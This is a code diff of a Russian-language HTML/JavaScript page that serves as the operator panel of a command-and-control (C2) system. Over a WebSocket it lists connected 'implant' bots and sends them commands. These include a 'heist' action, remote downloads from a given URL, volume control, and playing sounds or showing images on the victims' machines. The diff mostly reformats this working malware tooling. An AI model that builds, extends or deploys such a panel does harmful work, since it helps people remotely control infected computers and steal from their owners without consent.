@@ -2,14 +2,9 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Панель Управления</title>
+    <title>C2 Панель Управления v1.0</title>
     <style>
-        :root {
-            --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d;
-            --text-color: #e1e1e1; --accent-color: #00aaff; --recon-color: #007bff;
-            --heist-color: #dc3545; --system-color: #6f42c1; --prank-color: #28a745;
-            --download-color: #ffc107;
-        }
+        :root { --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d; --text-color: #e1e1e1; --accent-color: #00aaff; --recon-color: #007bff; --heist-color: #dc3545; --system-color: #6f42c1; --prank-color: #28a745; --download-color: #ffc107; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 25px; display: flex; justify-content: center; }
         .container { width: 100%; max-width: 900px; display: flex; flex-direction: column; gap: 25px; }
         h1, h2 { color: var(--accent-color); text-align: center; margin: 0; padding-bottom: 10px; }
@@ -18,8 +13,6 @@
         section { background-color: var(--primary-color); padding: 25px; border-radius: 12px; border: 1px solid var(--secondary-color); }
         button { color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 1em; font-weight: bold; width: 100%; transition: all 0.2s ease-in-out; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box; }
         button:hover { filter: brightness(1.2); }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid var(--secondary-color); background-color: var(--bg-color); color: var(--text-color); box-sizing: border-box; }
         .btn-bot { background-color: #495057; }
         .btn-bot.selected { border: 3px solid var(--accent-color); background-color: #0056b3; }
         .btn-recon { background-color: var(--recon-color); }
@@ -27,6 +20,7 @@
         .btn-system { background-color: var(--system-color); }
         .btn-prank { background-color: var(--prank-color); }
         .btn-download { background-color: var(--download-color); color: #1a1a1c; }
+        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid var(--secondary-color); background-color: var(--bg-color); color: var(--text-color); box-sizing: border-box; }
         footer { margin-top: 20px; text-align: center; min-height: 1.5em; font-weight: 500; color: var(--accent-color); }
         .grid-controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
         .flex-container { display: flex; flex-wrap: wrap; gap: 25px; }
@@ -35,7 +29,8 @@
 </head>
 <body>
 <div class="container">
-    <header><h1>Панель Управления</h1></header>   <main>
+    <header><h1>Панель Управления</h1></header>
+    <main>
         <section>
             <h2>Боты в сети</h2>
             <div id="bot-list" class="grid-controls"><p>Подключение к серверу...</p></div>
@@ -60,87 +55,53 @@
                 <h2>Пранки и Медиа</h2>
                 <div class="grid-controls">
                     <div>
-                        <h3>Управление звуком</h3>
-                        <label for="volume-slider">Системная Громкость</label>
+                        <h3>Управление звуком</h3><label for="volume-slider">Системная Громкость</label>
                         <input type="range" id="volume-slider" min="0" max="100" value="50" oninput="setVolume(this.value)">
                         <button class="btn-system" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
                     </div>
-                    <div>
-                        <h3>Локальные звуки</h3>
-                        <div id="audio-files-list" class="grid-controls"></div>
-                    </div>
-                    <div>
-                        <h3>Локальные изображения</h3>
-                        <div id="image-files-list" class="grid-controls"></div>
-                    </div>
+                    <div><h3>Локальные звуки</h3><div id="audio-files-list" class="grid-controls"></div></div>
+                    <div><h3>Локальные изображения</h3><div id="image-files-list" class="grid-controls"></div></div>
                 </div>
             </section>
         </div>
     </main>
     <footer id="status-footer">Инициализация...</footer>
 </div>
-
 <script>
     const wsURL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`;
-    const ui = {
-        botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'),
-        selectedBotName: document.getElementById('selected-bot-name'), statusFooter: document.getElementById('status-footer'),
-        audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'),
-        volumeSlider: document.getElementById('volume-slider'), urlInput: document.getElementById('url-input'),
-    };
+    const ui = { botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'), selectedBotName: document.getElementById('selected-bot-name'), statusFooter: document.getElementById('status-footer'), audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'), volumeSlider: document.getElementById('volume-slider'), urlInput: document.getElementById('url-input'), };
     let socket, selectedBotId = null;
-
     function connect() {
-        ui.statusFooter.textContent = "Подключение к C2...";
-        socket = new WebSocket(wsURL);
+        ui.statusFooter.textContent = "Подключение к C2..."; socket = new WebSocket(wsURL);
         socket.onopen = () => { ui.statusFooter.textContent = "Соединение установлено."; socket.send(JSON.stringify({ type: 'operator'})); };
-        socket.onmessage = (event) => {
-            const msg = JSON.parse(event.data);
-            if (msg.type === 'bot_list') updateBotList(msg.data);
-            else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) handleBotDetails(msg.data);
-        };
+        socket.onmessage = (event) => { const msg = JSON.parse(event.data); if (msg.type === 'bot_list') { updateBotList(msg.data); } else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) { handleBotDetails(msg.data); } };
         socket.onclose = () => { ui.statusFooter.textContent = "Соединение потеряно. Переподключение..."; selectBot(null); setTimeout(connect, 3000); };
     }
-
     function updateBotList(bots) {
-        const currentSelected = selectedBotId;
-        ui.botList.innerHTML = bots.length ? '' : '<p>Нет активных ботов.</p>';
+        const currentSelected = selectedBotId; ui.botList.innerHTML = bots.length ? '' : '<p>Нет активных ботов.</p>';
         bots.forEach(botId => { const btn = document.createElement('button'); btn.textContent = botId.replace('implant_', ''); btn.className = 'btn-bot'; btn.onclick = () => selectBot(botId); ui.botList.appendChild(btn); });
-        if (currentSelected && bots.includes(currentSelected)) { const btn = Array.from(ui.botList.childNodes).find(b => `implant_${b.textContent}` === currentSelected); if(btn) selectBot(currentSelected); } 
-        else { selectBot(bots.length > 0 ? bots[0] : null); }
+        if (currentSelected && bots.includes(currentSelected)) { selectBot(currentSelected); } else { selectBot(bots.length > 0 ? bots[0] : null); }
     }
-
     function selectBot(botId) {
         selectedBotId = botId;
         ui.botList.querySelectorAll('button').forEach(btn => { btn.classList.toggle('selected', `implant_${btn.textContent}` === botId); });
-        if (botId) { ui.controlsWrapper.style.display = 'block'; ui.selectedBotName.textContent = botId.replace('implant_', ''); socket.send(JSON.stringify({ type: 'get_details', target_id: botId })); } 
-        else { ui.controlsWrapper.style.display = 'none'; }
+        if (botId) { ui.controlsWrapper.style.display = 'block'; ui.selectedBotName.textContent = botId.replace('implant_', ''); socket.send(JSON.stringify({ type: 'get_details', target_id: botId })); } else { ui.controlsWrapper.style.display = 'none'; }
     }
-
-    function handleBotDetails(data) {
-        if (data.files) renderBotFiles(data.files);
-        if (data.volume !== undefined) ui.volumeSlider.value = data.volume;
-    }
-
+    function handleBotDetails(data) { if (data.files) renderBotFiles(data.files); if (data.volume !== undefined) ui.volumeSlider.value = data.volume; }
     function renderBotFiles(files) {
         const createButtons = (fileList, container, action) => {
             container.innerHTML = fileList && fileList.length ? '' : '<p>Файлы не найдены.</p>';
-            if (fileList) fileList.forEach(file => { const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank'; btn.onclick = () => sendCommand({ action, filename: file }); container.appendChild(btn); });
-        };   createButtons(files.audio, ui.audioFilesList, 'play');
-        createButtons(files.image, ui.imageFilesList, 'show');
+            if (fileList) fileList.forEach(file => { const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank'; btn.onclick = () => sendCommand({ action, filename: file }); container.appendChild(btn); });};
+        createButtons(files.audio, ui.audioFilesList, 'play'); createButtons(files.image, ui.imageFilesList, 'show');
     }
-
     function sendCommand(payload) {
         if (!selectedBotId) return;
         if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
-        socket.send(JSON.stringify({ type: 'command', target_id: selectedBotId, payload }));
-        ui.statusFooter.textContent = `Команда '${payload.action}' отправлена.`;
+        socket.send(JSON.stringify({ type: 'command', target_id: selectedBotId, payload })); ui.statusFooter.textContent = `Команда '${payload.action}' отправлена.`;
     }
-
     function downloadFile() { const url = ui.urlInput.value.trim(); if (url) { sendCommand({ action: 'download', url }); ui.urlInput.value = ''; } }
     const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
     const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 200);
-
     connect();
 </script>
 </body>
